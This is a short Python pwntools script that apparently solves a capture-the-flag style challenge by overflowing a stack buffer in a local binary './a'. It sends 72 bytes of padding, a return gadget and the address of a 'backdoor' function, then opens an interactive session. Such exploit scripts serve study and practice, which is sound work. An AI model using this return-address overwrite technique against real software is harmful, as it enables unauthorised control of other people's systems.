import os
from pathlib import Path

from pwn import *


context.binary = elf = ELF("./a", checksec=False)

base = Path(__file__).resolve().parent
fake_dr_dir = base / "dynamorio-min"
drrun = fake_dr_dir / "bin64" / "drrun"

os.environ["ET_DYNAMORIO_DIR"] = str(fake_dr_dir)

r = process(['ELF_Tracker', './a'])

r.recvuntil(b"Your input:\n")
r.sendline(b"A" * 72 + p64(0x401016) + p64(elf.symbols["backdoor"]))

r.interactive()
